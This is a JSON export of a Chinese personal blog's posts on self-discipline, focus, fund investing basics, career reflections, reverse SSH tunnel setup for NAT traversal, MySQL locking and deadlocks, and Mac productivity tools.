对了，这个安静的小地方叫『三味书屋』，至于哪三味能让我如此安静的写完文章，待我下次再来问一问。","categories":[],"tags":[{"name":"闲聊","slug":"闲聊","permalink":"https://noogel.xyz/tags/%E9%97%B2%E8%81%8A/"}]},{"title":"有关音乐带给我的成长","slug":"关于生活/有关音乐带给我的成长","date":"2018-09-18T00:00:00.000Z","updated":"2025-07-23T07:30:58.920Z","comments":true,"path":"2018/09/18/1.html","link":"","permalink":"https://noogel.xyz/2018/09/18/1.html","excerpt":"","text":"找到一份歌单，正如它的名字那样 看书学习必备轻音乐 ，调到适合的音量，一边放着音乐一遍学习，可以整个人专注到学习当中，减少学习带来的焦虑感。进而引发了一个理科生对于音乐的好奇心。 为什么平时难以持续的专注力在音乐的作用下却得到了提高呢？ 好奇心的驱使下，看到知乎对于音乐的定义： 人们用音乐来抒发情感释放情绪，那么同时音乐也会影响我们的情绪。而当我把这些音乐分享给周边的朋友，他们听了却有不同的感受，基本觉得并没有效果，看来音乐带给每个人的感受都是不同的，音乐也有适合它的人吧。 今天边听音乐边学习，一边是新的技术知识，一边是熬人的英文教程，同时还琢磨出一套边看边学的方式，希望能养成习惯带给我英语的提升。先写到这里，如下是学习过程中的截图，仅此记录今天的感受。","categories":[],"tags":[{"name":"闲聊","slug":"闲聊","permalink":"https://noogel.xyz/tags/%E9%97%B2%E8%81%8A/"}]},{"title":"高度自律：为了高度自由","slug":"关于生活/高度自律_为了高度自由","date":"2018-09-02T00:00:00.000Z","updated":"2025-07-23T07:30:58.920Z","comments":true,"path":"2018/09/02/2.html","link":"","permalink":"https://noogel.xyz/2018/09/02/2.html","excerpt":"","text":"情绪管理是自律的基础每一件让你痛苦的人或事背后，都有不理性的『活该（沉溺其中）』气质冷静，不要在该动脑子的时候动感情减少依赖性，接受多样性，独立有主见 正确三观是自律之本真诚坦荡（坚持一些正确的三观）不要太在乎外在的评价（容易失去主见）时间换金钱，专业（专业能力）换尊重靠谱是最低成本的社交方式mark：我觉得这里靠谱的前提是需要能客观的对待自己的能力，能力之内的事要努力做好，能力之外的事要方圆的处理掉。 新闻人眼中的『不自律』概念研究自律需要知道什么是『不自律』，通过以下几点去分析： 『不自律』的恶性循环 励志鸡汤不要听&#x3D;&#x3D; 普通人怎样寻求进步『观摩活法、研究自己、发现意义、踏上征程、循环往复 』经历不可复制，但能受到启发『与其艳羡那个人，不如成为那个人，自己发光，美丽。具备价值，才是正事』 自律先要接受平淡现实没什么惊心动魄，多是平凡琐碎（保持良好的精神状态，保持比较好的体态，保持一项运动，实时看起来都是比较爽朗的状态）『精良并非朝夕，而是长久坚持』『终身学习』不是口号而是行动恒毅力——持续的热情和付出 自律恒动力是自我选择不被强迫，纯属自愿（需要从主观意愿上想坚持这件事）自己选择的路，能够考虑到其中困难要坚持住。 自律必有优先级分类计划重要紧急四象限 重要且紧急 紧急不重要（时间上的要求） 重要不紧急（长线过程） 不重要不紧急 时间管理摒弃死板、学会变通为不确定性的事件预留时间建立及时调整计划的意识保持工作生活社交各方的平衡（计划交叉） 擅于使用工具记录计划日记本——记录的仪式感手机备忘录、印象笔记——备忘、提高效率使用APP——倒数日、小米运动、咕咚、趁早、好轻 避免干扰自律因素出现关闭手机不必要推送通知——保留电话、微信、权威新闻APP推送（新闻BBC、中文凤凰）固定时间消遣——打游戏、刷社交、看直播精简关注同类微博账号、微信公众号——内容分类，选取最优，劣质产品取关屏蔽无聊无脑信息——不看他（她）的朋友圈、知乎关注话题分类 拒绝缺乏思考的拼命勤奋从根本避免在错误规划的道路上越走越远精力守恒，避免三分钟热度、虎头蛇尾更改碎片化阅读习惯，随身携带书纸笔（iPad蓝牙键盘） 金钱自律法则钱是赚出来的，不是省出来的努力赚钱不俗，打工攒钱不low将知识与爱好变现是绝对快乐不是买不起贵的，而是只买对的 用自律培养真正爱好休闲消遣不是爱好爱好不能浅尝辄止get任何技能都需要付出时间和坚持 自律的体现","categories":[],"tags":[{"name":"自律","slug":"自律","permalink":"https://noogel.xyz/tags/%E8%87%AA%E5%BE%8B/"}]},{"title":"计算机名词收录（持续更新）","slug":"关于技术/计算机名词收录（持续更新）","date":"2018-05-16T00:00:00.000Z","updated":"2025-07-23T07:30:58.918Z","comments":true,"path":"2018/05/16/1.html","link":"","permalink":"https://noogel.xyz/2018/05/16/1.html","excerpt":"","text":"UGCUGC是互联网术语，全称为User Generated Content，含义为用户生成内容，即用户原创内容。UGC的概念最早起源于互联网领域，即用户将自己原创的内容通过互联网平台进行展示或者提供给其他用户。UGC是伴随着以提倡个性化为主要特点的Web2.0概念兴起的，也可叫做UCC。 PGCPGC互联网术语，指专业生产内容、专家生产内容。用来泛指内容个性化、视角多元化、传播民主化、社会关系虚拟化。也称为PPC,(Professionally-produced Content）。PGC，专业生产内容。经由传统广电业者按照几乎与电视节目无异的方式进行制作，但在内容的传播层面，却必须按照互联网的传播特性进行调整。 OGCOGC（Occupationally-generated Content）职业生产内容，其内容生产主体是具备一定知识和专业背景的从业人员，他们从职业身份出发参与生产并从中获得报酬。OGC对于内容是生产者设置了更高的门槛，不仅要求具备知识或资历，还要求有职业身份，这最大成苏生对生产者进行了过滤，从而有助于生产出更多更高质量的内容。但这隔绝了网民的参与，互动性受限，生产成本也更高。 DAUDAU 指日活跃用户数量。常用于反映一日内网站、互联网应用或网络游戏的运营情况。DAU通常统计一日（统计日）之内，登录或使用了某个产品的用户数（去除重复登录的用户），这与流量统计工具里的访客（UV）概念相似。 MAUMAU 指月活跃用户人数。常用于反映一个月内网站、互联网应用或网络游戏的运营情况。MAU是一个用户数量统计名词，指网站、app等月活跃用户数量（去除重复用户数），数量的大小反应用户的活跃度。 TOTP基于时间的一次性密码算法：TOTP 是一种根据预共享的密钥与当前时间计算一次性密码的算法。TOTP是散列消息认证码（HMAC）当中的一个例子。它结合一个私钥与当前时间戳，使用一个密码散列函数来生成一次性密码。由于网络延迟与时钟不同步可能导致密码接收者不得不尝试多次遇到正确的时间来进行身份验证，时间戳通常以30秒为间隔，从而避免反复尝试。 有限状态机（FSM）有限状态机又称有限状态自动机，简称状态机，是表示有限个状态以及在这些状态之间的转移和动作等行为的数学模型。 米利型有限状态机是基于它的当前状态和输入生成输出的有限状态自动机。 摩尔型有限状态机是指输出只由当前的状态所确定的有限状态自动机。 Kata (programming)A code kata is an exercise in programming which helps programmers hone their skills through practice and repetition. 联机分析处理（OLAP）On-Line Analytical Processing需以大量历史数据为基础配合上时间点的差异并对多维度及汇整型的信息进行复杂的分析。 联机事务处理（OLTP）On-Line Transaction Processing是传统的关系型数据库的主要应用，主要是基本的、日常的事务处理，例如银行交易。 ETL在抽取、变换和装入（ETL）过程中，数据是从各种数据源抽取而来，通过编码的业务规则进行转换和规范化，然后装入数据集市的事实表和维表。 MapReduce是Google提出的一个软件架构，概念“Map（映射）”和“Reduce（归纳）”，及他们的主要思想，都是从函数式编程语言借来的。当前的软件实现是指定一个 Map（映射） 函数，用来把一组键值对映射成一组新的键值对，指定并发的 Reduce（归纳） 函数，用来保证所有映射的键值对中的每一个共享相同的键组。","categories":[],"tags":[{"name":"术语","slug":"术语","permalink":"https://noogel.xyz/tags/%E6%9C%AF%E8%AF%AD/"}]},{"title":"提升专注力的方法","slug":"关于生活/提升专注力的方法","date":"2018-03-31T00:00:00.000Z","updated":"2025-07-23T07:30:58.920Z","comments":true,"path":"2018/03/31/2.html","link":"","permalink":"https://noogel.xyz/2018/03/31/2.html","excerpt":"","text":"这篇文章是根据学习知乎 Live 提升专注力的四个方法 总结的学习笔记。 大纲先放一个大纲，然后写出学习后会总结的点。 主要内容主要分四个大块： 像设计游戏一样设计任务（目标、规则、障碍） 我们要达成一个任务或者目标，首先将任务拆分成一个个小的、明确的小任务，每一个环节不用太难，也不用太简单，按照自己的专注力上限设计任务。 每一个小环节可以设置一些障碍，来提升成就感，通过不断的成就感的提升驱使完成目标，在成就感与挫败感之间寻找一个平衡。 这样可以在不断的达成目标时提升自己的专注力上限。 创造使用推理和类比的机会 专注力应该是一种思维能力，而不仅仅是一种强制力。需要的是脑力的专注力，而不是身体的专注力。提升这些的方法是推理和类比。 推理：通过一个点，去不断深挖，了解其本质。（推理解决 A ——&gt; 什么是 A ？怎么产生的 A ？ ——&gt; 产生 A 的是什么？[是否有经验性的证据？] ——&gt; 对这件事情我的理解是什么？ ——&gt; 我是否可以更深入的了解？） 类比：相同事物的相关性思考。思考一个事物可以通过相关性的联系来帮助你理解。 一件事情的训练需要可以的练习。 创造和使用推理和类比的机会。 费曼学习法则：如何把这个东西通俗易懂的讲解给别人？ 笔记整理和回顾 输出：和别人分享你的经验、知识和见解（例如我写了这篇文章） 反驳：养成反驳自己的习惯，站在相反的观点思考问题，左右互搏。通过自我辩论的方式。 学习之前寻找『困惑感』 如何快速进入学习状态？积累困惑感。困惑感是你学习一个东西的源动力，当你找到足够多的困惑时，你学习一个东西的时候会更加专注。 当你不知道自己有什么困惑的时候，需要先创造困惑感。 根据主题寻找知识，更能提高你的兴趣。 当你有问题的时候决定你如何看书，而不是被书牵着鼻子走。 读一本书之前，先评估一本书是否适合你。 首选根据作者选书。如果你觉得一本书写的很好，那么不妨看看这个作者的其它书。 其次是看书的目录和简介，可以判断一本书的难易程度。 看豆瓣和亚马逊的评分和评论。看其中的差评可以了解一本书的不足。 通过以上三点来了解一本书是否适合你🌹时间去读。 抗干扰能力的养成 —— 学会和大脑相处 做任何一件事情的时候不要过早退出循环。 不要太习惯于失败的模式，要思考如何才能去成功。 情绪控制 选择控制 不要给自己太多的选择。 信息控制 上面有部分的音频不能播放，不知道什么原因，👂不了 最后再贴一张图，是作者 PPT 中的一部分，觉得总结的很好，贴出来分享。 最后这里提到的四块总结都是很实用的点，里面很多地方博主也是深有体会的。主要差在了刻意练习上面，不能很好的和自己的大脑相处，就像《象与骑象人》中描述的，骑象人无法很好的驾驭🐘，是因为不够了解🐘，缺乏足够的练习。","categories":[],"tags":[{"name":"认知","slug":"认知","permalink":"https://noogel.xyz/tags/%E8%AE%A4%E7%9F%A5/"}]},{"title":"计划书单","slug":"关于未来/计划书单","date":"2018-03-31T00:00:00.000Z","updated":"2025-07-23T07:30:58.919Z","comments":true,"path":"2018/03/31/1.html","link":"","permalink":"https://noogel.xyz/2018/03/31/1.html","excerpt":"","text":"计划书单废弃，剩下的书并没有制定计划读下去，而是被工作需要左右了学习方向。 update at 2019-05-22 首先是书名，后面跟随的时间是读完的时间。 情商管理《秘密-朗达.拜恩》 《情商套装6册-丹尼尔.戈尔曼》 《6秒钟改变你的情商-乔舒瓦弗理》 心理学《社会心理学》 《象与骑象人》 2018.02 《最熟悉的陌生人》 《心理学与生活》 《裸猿三部曲》 软件工程《代码大全》 《微服务设计》 2017.08 《程序员的自我修养：链接、装载与库》 散文随笔《走到人生边上：自问自答》 语言文学《蔡康永的说话之道（套装2册）》 经济管理《金字塔原理1+2》 其它《数学之美》 2016.xx 《天才在左疯子在右》 2015.xx 《最好的告别：关于衰老与死亡，你必须知道的常识》 《黄金时代-王小波》 《一九八四-乔治·奥威尔》","categories":[],"tags":[{"name":"书单","slug":"书单","permalink":"https://noogel.xyz/tags/%E4%B9%A6%E5%8D%95/"},{"name":"计划","slug":"计划","permalink":"https://noogel.xyz/tags/%E8%AE%A1%E5%88%92/"}]},{"title":"如何选购基金","slug":"关于生活/如何选购基金","date":"2018-03-17T00:00:00.000Z","updated":"2025-07-23T07:30:58.919Z","comments":true,"path":"2018/03/17/1.html","link":"","permalink":"https://noogel.xyz/2018/03/17/1.html","excerpt":"","text":"基金适合什么样的人？ 没有太多时间关注市场的人 对某种理财产品不了解又比较感兴趣 有闲钱 3-5 年用不到，不适合短线投资 买基金要考虑什么？ 能不能坚持长期持有基金？ 能不能承担风险？因为有可能亏损。 买基金的钱会不会影响我的生活？ 基金的风格和种类，是投资的哪种类型的资产？ 基金的类型 高中低风险综合配置，可以有侧重。 货币基金： 以余额宝为举例，风险低，收益不高且稳定。基金规模占总体的一半以上。 债券基金： 纯债基金全部用来买债券，分为短债基金（一年左右，收益和风险略高于余额宝）;长债基金（3-5年长期债券，风险和收益比短债高一些）。还有一种拿一部分用来买股票，分为一级债基（主要是打新股）和二级债基（可以买股票）。 可转债基金： … 混合基金： 主动型基金的主要品种，配置灵活，可以买股票、债券、大宗商品、货币等。 对冲基金和量化基金： 震荡市场下严格按照模型去调整。 指数基金： 不太依赖基金经理，受整体市场平均值影响。跟踪某一类股票指数的涨跌走，主要是做好模型，追求平均收益。（国内指数基金种类比较少）（若于美国和香港市场） 股票型基金： 基金经理按照股票市场的形式去调整。每个基金和基金经理的风格和他们团队的风格不同而不同。 增强指数基金： … 主动型基金： 依赖基金经理团队的能力。需要挑好基金经理，基金团队，可获得超平均收益。 分级基金： 门槛比较高，风险比价高。 QD基金： 投资海外。 购买基金的渠道 基金公司官网（专卖店）（产品比较单一） 基金公司运营的公众号、APP 证券公司炒股软件（适合场内基金） 第三方基金平台（基金超市）（赎回时间比较短一些） 银行 推荐使用第三方平台，基金类型丰富，介绍详细，方便对比。 蚂蚁聚宝、天天基金网、好买基金网（看数据） 回撤率? 主动型基金看什么？成立时间比较久的（稳步上升）基金以往业绩（长期业绩、平均收益）基金经理的水平（以往业绩、回报率、擅长强项、基金投资风格）回撤率基金评级（基金购买页面标星）（指数基金没有评级）夏普（冒一个单位风险获得的收益越大基金越好） 不要过于纠结以往业绩 基金转换功能买入一个基金，可以直接在同基金公司转换为另一个基金公司，转换过程只收申购费的差价，不需要买入卖出的申购费。 想节省申购费只能用同一个基金公司的基金互转，基金官网支持的转换种类比较多，第三方平台支持的比较少。 利用基金公司官网货基零元购，再去转换到其它基金，有的在转换中不需要再交申购费。不支持 QD 基金。 QD 基金申购费比较贵，申购和赎回都比国内基金高。 基金公司主要靠管理费来赚钱。 公募基金关注基金规模（更稳健），私募基金主要关注收益（更激进）。 场内基金是可以通过炒股软件来买的。带 ETF、LOF 后缀的是场内基金，申购费比较低。场内基金比较灵活，可以当天买当天卖。手续费一般都在 0.02% ~ 0.03%，适合短线投资。 定投基本原则逢低买入，逢高卖出，越跌越买，越涨越卖，定期不定额，止盈不止损。（反人性）","categories":[],"tags":[{"name":"理财","slug":"理财","permalink":"https://noogel.xyz/tags/%E7%90%86%E8%B4%A2/"}]},{"title":"谈谈工作这三年","slug":"关于生活/谈谈工作这三年","date":"2018-01-28T00:00:00.000Z","updated":"2025-07-23T07:30:58.920Z","comments":true,"path":"2018/01/28/1.html","link":"","permalink":"https://noogel.xyz/2018/01/28/1.html","excerpt":"","text":"一不留神工作就三年了，准确的说是八个月的实习加两年七个月的正式。是该找个时间跟自己谈谈，也是在反思，这三年的得与失。就通过并不咋样的表达能力，列出以下几点去总结和反思一下吧。 毕业找工作在帝都的第一家公司是我在大四上学期通过一个学长推荐进去的。也是有一些幸运的成分，之前在大学所在城市一家公司和几个同学一起实习，没几个月就发现工作环境并不是我想要的，就想着要去帝都闯一闯，也是为了躲避前女友母亲逼迫她毕业就回家的要求。当时自学了两个月的 Python ，和同学业余时间搞了一个项目，面向学校学生，大概有一两万用户吧。正想着去北京找找工作看，发现学长的公司在校招，就找他内推了一把，笔试比较惨，但还是被录取了。 在帝都第一家公司录取后很快我就从上一家公司离职奔来北京入职了，从实习到试用再到正式，一切都比较顺顺利利的，还两次评到了优秀员工。带我的那个师傅比较认真给我不少帮助，而我平时和学长混的也不错。强制的代码规范，不断评审的代码设计给我成长不小帮助，渐渐在组内任务越来越重，主要是公司内部的管理系统开发。说起学长，给我的感觉是做技术的有两种人，一种是为了技术做技术的人，另一种是为了生活做技术的人，学长走了我身边就只剩下另一种人了，而我渐渐的成了两者之间的一种人，最终还是会趋于其中一种。 为什么从上一家离职离职的原因无非两种，待得不爽和给的钱少。之于我也是这两点吧，这两年从无知到渐渐确定了自己的方向，路不同便只好挥挥手告别。 今后有什么规划目前在一家明星公司，在这个环境里还有很大的成长空间，方向也不错，踏实学习成长，后面的路还是比较长的。就现在的状况来说，更主要的是注重技术的成长，从做内部系统到结算系统到现在的支付系统，更专注与业务方向，对语言的选择并不那么重要了。 两个方面，一方面是后端技术栈的经验积累，另一方面是产品层面的业务划分与设计能力。 2018继续加油，做一个为技术做技术的人。","categories":[],"tags":[{"name":"闲聊","slug":"闲聊","permalink":"https://noogel.xyz/tags/%E9%97%B2%E8%81%8A/"}]},{"title":"SHH打洞配置","slug":"关于技术/系统经验/SSH打洞配置","date":"2018-01-07T00:00:00.000Z","updated":"2025-07-23T07:30:58.917Z","comments":true,"path":"2018/01/07/2.html","link":"","permalink":"https://noogel.xyz/2018/01/07/2.html","excerpt":"","text":"拿三台机器举例打洞配置讲解 机器 网络环境 用途 SSH服务 A机器 公网IP固定 中转机器 需要 B机器 NAT网络 被访问机器 需要 C机器 任意网络环境 需要访问B机器 不需要 自动连接重试需要B机器向A机器建立 SSH 反向隧道，命令如下： autossh -p 22 -M 6777 -NR &#39;*:6766:127.0.0.1:22&#39; usera@a.site 通过 autossh 可以实现连接失败自动重连，*:6766:127.0.0.1:22 是将A机器的6766端口转发到B机器的22端口，usera@a.site 是请求B机器的用户名和地址。 打洞开启端口转发功能，编辑 sshd 的配置文件 &#x2F;etc&#x2F;ssh&#x2F;sshd_config，增加配置：GatewayPorts yes 另一台机器连接通过C机器对A机器的6766端口发起连接就会自动被转发到B机器。 ssh -p 6766 userb@a.site SSH 私钥认证把请求机器的 ~&#x2F;.ssh&#x2F;id_rsa.pub 添加到被请求机器的 ~&#x2F;.ssh&#x2F;authorzied_keys 文件中 同时设置文件权限为 chmod 600 ~/.ssh/authorzied_keys 设置后在连接机器的时候就不需要密码了，可以走私钥认证。 守护进程这里通过 supervisord 配置保证B机器重启后 autossh 能启动。 有固定公网IP的机器这里我选用的是阿里云的机器，因为平时用的量不大，所以选择按量付费就可以了，看了下费用大概 80RMB&#x2F;月。 参考： http://blog.csdn.net/lidongshengajz/article/details/73482908https://linux.cn/article-5975-1.html","categories":[],"tags":[{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://noogel.xyz/tags/Ubuntu/"}]},{"title":"2018知识储备计划","slug":"关于未来/2018知识储备计划","date":"2017-12-27T00:00:00.000Z","updated":"2025-07-23T07:30:58.918Z","comments":true,"path":"2017/12/27/1.html","link":"","permalink":"https://noogel.xyz/2017/12/27/1.html","excerpt":"","text":"后置更新… 四月 读书 《见识-吴军》 《领域驱动设计：软件核心复杂性应对之道》 Java相关 文章 Java相关的基础技术总结 Python各种技巧的技术使用（middleware、元类、with） 《象与骑象人》读书笔记 以上 三月三月并没有制定和学习计划，只是随心更新了几篇文章。 基金选购学习笔记 关于java的最初了解 git场景化操作 二月 写博客文章 关于自律[abandon] 关于技术成长[abandon] 后端技术栈（范围待定）[abandon] 读书 《象与骑象人》[done] 《编写可读代码的艺术》[done] 以上 为啥文章都没写呢，因为勒安懒… 不懒的时候补上吧😂 一月 写博客文章 mixin 模式[done] 整理修饰器模式[done] MRO 与多继承[abandon] 听书 《皮囊》[done] 读技术书籍 《亿级流量网站架构核心技术》[part] 以上","categories":[],"tags":[{"name":"书单","slug":"书单","permalink":"https://noogel.xyz/tags/%E4%B9%A6%E5%8D%95/"}]},{"title":"MySQL一些零散记录","slug":"关于技术/中间件/MySQL一些零散记录","date":"2017-12-17T00:00:00.000Z","updated":"2025-07-23T07:30:58.914Z","comments":true,"path":"2017/12/17/1.html","link":"","permalink":"https://noogel.xyz/2017/12/17/1.html","excerpt":"","text":"MySQL 大小写区分问题 sql_mode 配置Modes affect the SQL syntax MySQL supports and the data validation checks it performs. This makes it easier to use MySQL in different environments and to use MySQL together with other database servers. 查看当前sql_mode12SELECT @@GLOBAL.sql_mode;SELECT @@SESSION.sql_mode; 设置当前sql_mode12SET GLOBAL sql_mode = &#x27;modes...&#x27;;SET SESSION sql_mode = &#x27;modes...&#x27;; Full list of SQL Modelshttps://dev.mysql.com/doc/refman/5.7/en/sql-mode.html &#x2F;*!40001 SQL_NO_CACHE *&#x2F;/*! */ 这是 mysql 里的语法，并非注释，! 后面是版本号，如果本数据库等于或大于此版本号，那么注释内的代码也会执行。 关于这个条件的问答： https://lists.mysql.com/mysql/203373 MySQL 锁表种类常见的有行锁和表锁。表锁会锁住整张表，并发能力弱，开发中要避免使用表级锁。行锁只将单行数据锁住，锁数据期间对其它行数据不影响，并发能力高，一般使用行锁来处理并发事务。MySQL是如何加不同类型的锁的？对于加锁数据的筛选条件，有其对应的索引建立，MySQL可以快速定位的数据进行行级加锁；而对于没有索引的情况，MySQL 的做法是会先锁住整张表，然后再去获取数据，然后将不满足条件的数据锁释放掉。 等待锁超时问题Lock wait timeout exceeded; try restarting transaction一种情况是因为有操作语句对整个表加锁了，这里发现的例子是在开启事务做 UPDATE 更新时发现的，UPDATE 条件如果不是主键或者没有索引则会锁整张表，只有以主键为条件或完全匹配的唯一索引做更新才是行级锁。还有就是另一个事务中持有锁时间过长导致。 123456SELECT * FROM INNODB_TRX; // 查看事务表锁状态// 创建事务，更新语句，但是不提交SET SESSION AUTOCOMMIT=off;BEGIN;UPDATE tabl1 SET status=1 WHERE expired_at &lt;123456 AND expired_at &gt;= 12346 AND `status` = 0; 这时候再去提交则会报等待锁超时问题。 http://www.toniz.net/?p=556 加行锁的注意事项： http://blog.csdn.net/u014453898/article/details/56068841 插入语句死锁问题在 INSERT 语句中出现 Deadlock found when trying to get lock; try restarting transaction 是因为范围匹配加锁是对索引页加锁了，导致其它事务插入数据时报死锁。处理办法是查询改成行锁，以 ID 或唯一索引加锁。 这里需要强调的是尽量避免使用范围加锁。最好是通过主键加行锁处理。 避免加锁失败和发生死锁的注意事项 减少锁占用时间，避免拿锁时做过多耗时操作。 加锁条件需对应加索引，尽量为行级锁。 避免死锁需要再开启事务后一次将所需资源加锁，处理后及时 COMMIT 释放锁。 对于请求的网络资源，首先将所需外部资源准备好。 对于开启事物后加锁，只有 COMMIT 后方可释放锁 在捕获异常中的处理，在捕获异常后要记得 ROLLBACK 等待锁超时时间一般设置在 1-2 秒时间 SET innodb_lock_wait_timeout=1。 MySQL 事务 http://blog.csdn.net/zhaoyangjian724/article/details/52858519 先非主键范围加锁查看事务状态插入区分度高的数据-成功插入区分度低的数据-失败查看引擎状态，发现页锁改为以主键做查询条件加锁插入区分度低的数据-成功 SELECT * FROM INNODB_TRX; SHOW ENGINE INNODB STATUS; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135=====================================2017-12-18 11:47:27 7fd5dd6f6700 INNODB MONITOR OUTPUT=====================================Per second averages calculated from the last 57 seconds-----------------BACKGROUND THREAD-----------------srv_master_thread loops: 22630 srv_active, 0 srv_shutdown, 15047550 srv_idlesrv_master_thread log flush and writes: 15067795----------SEMAPHORES----------OS WAIT ARRAY INFO: reservation count 21761OS WAIT ARRAY INFO: signal count 42765Mutex spin waits 38129, rounds 296291, OS waits 3638RW-shared spins 25778, rounds 578697, OS waits 16634RW-excl spins 4632, rounds 145148, OS waits 1184Spin rounds per wait: 7.77 mutex, 22.45 RW-shared, 31.34 RW-excl------------TRANSACTIONS------------Trx id counter 167458Purge done for trx&#x27;s n:o &lt; 167444 undo n:o &lt; 0 state: running but idleHistory list length 942LIST OF TRANSACTIONS FOR EACH SESSION:---TRANSACTION 0, not startedMySQL thread id 2700260, OS thread handle 0x7fd5dd6f6700, query id 16186792 10.21.0.2 wallet initSHOW ENGINE INNODB STATUS---TRANSACTION 167433, not startedMySQL thread id 2700100, OS thread handle 0x7fd5dd7fa700, query id 16185344 10.100.27.2 wallet cleaning up---TRANSACTION 167449, not startedMySQL thread id 2700073, OS thread handle 0x7fd5e6581700, query id 16186116 10.100.53.2 wallet cleaning up---TRANSACTION 167434, not startedMySQL thread id 2700060, OS thread handle 0x7fd5e6685700, query id 16185479 10.100.53.2 wallet cleaning up---TRANSACTION 0, not startedMySQL thread id 2699993, OS thread handle 0x7fd5dd5f2700, query id 16184159 10.100.27.2 wallet cleaning up---TRANSACTION 0, not startedMySQL thread id 2699968, OS thread handle 0x7fd5dd633700, query id 16183926 10.100.53.2 wallet cleaning up---TRANSACTION 0, not startedMySQL thread id 2699967, OS thread handle 0x7fd5dd7b9700, query id 16183863 10.100.53.2 wallet cleaning up---TRANSACTION 0, not startedMySQL thread id 2699966, OS thread handle 0x7fd5e6540700, query id 16183754 10.100.53.2 wallet cleaning up---TRANSACTION 0, not startedMySQL thread id 2699965, OS thread handle 0x7fd5e4049700, query id 16183668 10.100.53.2 wallet cleaning up---TRANSACTION 0, not startedMySQL thread id 2699964, OS thread handle 0x7fd5e66c6700, query id 16183581 10.100.53.2 wallet cleaning up---TRANSACTION 0, not startedMySQL thread id 2699963, OS thread handle 0x7fd5dd6b5700, query id 16183494 10.100.53.2 wallet cleaning up---TRANSACTION 167457, ACTIVE 11 sec insertingmysql tables in use 1, locked 1LOCK WAIT 2 lock struct(s), heap size 360, 1 row lock(s), undo log entries 1MySQL thread id 2700275, OS thread handle 0x7fd5dd737700, query id 16186778 10.21.0.2 wallet updateINSERT INTO `ttt` (`id`, `no`, `trade_number`)VALUES (586, &#x27;856195904590458889&#x27;, &#x27;200526175912156728&#x27;)------- TRX HAS BEEN WAITING 11 SEC FOR THIS LOCK TO BE GRANTED:RECORD LOCKS space id 50 page no 5 n bits 96 index `idx_number` of table `test`.`ttt` trx id 167457 lock_mode X locks gap before rec insert intention waitingRecord lock, heap no 14 PHYSICAL RECORD: n_fields 2; compact format; info bits 0 0: len 29; hex 5a484c4956454255593230313730353236323233323432363434353939; asc ZHLIVEBUY20170526223242644599;; 1: len 8; hex 0000000000000229; asc );;---------------------TRANSACTION 167447, ACTIVE 602 sec4 lock struct(s), heap size 1184, 3 row lock(s)MySQL thread id 2699383, OS thread handle 0x7fd5e4251700, query id 16186751 10.21.0.2 wallet cleaning up--------FILE I/O--------I/O thread 0 state: waiting for completed aio requests (insert buffer thread)I/O thread 1 state: waiting for completed aio requests (log thread)I/O thread 2 state: waiting for completed aio requests (read thread)I/O thread 3 state: waiting for completed aio requests (read thread)I/O thread 4 state: waiting for completed aio requests (read thread)I/O thread 5 state: waiting for completed aio requests (read thread)I/O thread 6 state: waiting for completed aio requests (write thread)I/O thread 7 state: waiting for completed aio requests (write thread)I/O thread 8 state: waiting for completed aio requests (write thread)I/O thread 9 state: waiting for completed aio requests (write thread)Pending normal aio reads: 0 [0, 0, 0, 0] , aio writes: 0 [0, 0, 0, 0] , ibuf aio reads: 0, log i/o&#x27;s: 0, sync i/o&#x27;s: 0Pending flushes (fsync) log: 0; buffer pool: 06707 OS file reads, 383968 OS file writes, 119945 OS fsyncs0.00 reads/s, 0 avg bytes/read, 0.11 writes/s, 0.09 fsyncs/s-------------------------------------INSERT BUFFER AND ADAPTIVE HASH INDEX-------------------------------------Ibuf: size 1, free list len 74, seg size 76, 733 mergesmerged operations: insert 34, delete mark 169019, delete 2discarded operations: insert 0, delete mark 0, delete 0Hash table size 149489, node heap has 168 buffer(s)0.00 hash searches/s, 0.05 non-hash searches/s---LOG---Log sequence number 394355624Log flushed up to 394355624Pages flushed up to 394355624Last checkpoint at 3943556240 pending log writes, 0 pending chkp writes65750 log i/o&#x27;s done, 0.04 log i/o&#x27;s/second----------------------BUFFER POOL AND MEMORY----------------------Total memory allocated 77266944; in additional pool allocated 0Dictionary memory allocated 669112Buffer pool size 4607Free buffers 1024Database pages 3415Old database pages 1240Modified db pages 0Pending reads 0Pending writes: LRU 0, flush list 0, single page 0Pages made young 11699, not young 4750030.00 youngs/s, 0.00 non-youngs/sPages read 6606, created 13587, written 3007250.00 reads/s, 0.00 creates/s, 0.05 writes/sBuffer pool hit rate 1000 / 1000, young-making rate 0 / 1000 not 0 / 1000Pages read ahead 0.00/s, evicted without access 0.00/s, Random read ahead 0.00/sLRU len: 3415, unzip_LRU len: 0I/O sum[3]:cur[0], unzip sum[0]:cur[0]--------------ROW OPERATIONS--------------0 queries inside InnoDB, 0 queries in queue0 read views open inside InnoDBMain thread process no. 12657, id 140556665968384, state: sleepingNumber of rows inserted 227014, updated 19739, deleted 89828, read 478318140.00 inserts/s, 0.00 updates/s, 0.00 deletes/s, 0.00 reads/s----------------------------END OF INNODB MONITOR OUTPUT============================","categories":[],"tags":[{"name":"MySQL","slug":"MySQL","permalink":"https://noogel.xyz/tags/MySQL/"}]},{"title":"这些 Mac 神器也许你正需要","slug":"关于技术/效率/这些Mac神器也许你正需要","date":"2017-10-08T00:00:00.000Z","updated":"2025-07-23T07:30:58.915Z","comments":true,"path":"2017/10/08/1.html","link":"","permalink":"https://noogel.xyz/2017/10/08/1.html","excerpt":"","text":"这篇文章主要介绍Mac下常用的效率工具，也许正是你所需要的或者使用后对你的工作有很大的效率提升，废话不多说，看下面介绍的五款常用效率工具。 Alfred Alfred 作为神器的霸主地位可谓实至名归，它不仅可以帮我们快速打开切换应用、打开网址，使用计算器、词典、剪贴板增强等功能，还可以通过Workflow模块实现功能的扩展，下面详细介绍一下此神器的一些功能。 首先我们定义调出 Alfred 的快捷键，这里我设置的是 Command + Space ，可以启动输入框。 在输入框中我们可以输入想要打开或切换的应用： 也可以输入基本的数学公式，计算结果： 或者去 Google 搜索： 打开 Terminal 执行命令： 在 Web Search 中配置自定义打开的网址： 调出剪贴板历史，我设置的快捷键是 Option + Command + C： 默认回车会执行第一个结果，或打开网址，或将结果复制到剪贴板，这样可以极大地提高我们操作的效率。 当然这些默认的功能是不能够满足我们的，还可以通过 Worklow 去扩展效率工具，这里是自己做的一个效率工具箱 xyzUtils ： Github 地址： https://github.com/noogel/Alfred-Workflow 